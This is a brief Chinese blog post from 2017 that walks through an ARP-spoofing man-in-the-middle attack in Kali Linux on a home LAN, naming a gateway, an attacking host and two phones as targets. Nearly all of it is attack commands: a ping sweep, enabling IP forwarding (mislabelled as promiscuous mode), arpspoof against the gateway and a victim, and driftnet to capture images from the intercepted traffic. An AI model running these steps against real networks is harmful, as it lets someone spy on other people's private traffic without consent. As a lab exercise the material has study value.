---
title: Kali中利用ARP欺骗拦截图片
tags:
  - Arp欺骗
  - kali
date: 2017-04-08 20:43:04
---

## 攻击环境

#### 网关：

`192.168.155.1`
<!-- more -->
#### 攻击主机：

`Kali linux 2016.2`

`IP：192.168.155.4`

#### 被攻击主机：

`坚果YQ607`

`IP：192.168.155.3`

`IPHONE(IOS9.3.5)`

`IP：192.168.155.2`

##  攻击步骤

#### 0x00 查看ip及网卡信息

`ifconfig`

#### 0x01 探查同网段主机

`fping -g 192.168.155.1/24`

#### 0x02 设置混杂模式

`echo 1 >> /proc/sys/net/ipv4/ip_forward  `

#### 0x03 用arpspoof来进行中间人攻击

`arpspoof -i eth0 -t 192.168.155.1 192.168.155.3`

#### 0x04 查看网卡拦截的图片

`driftnet -i eth0`

![](/img/kaliarp.png)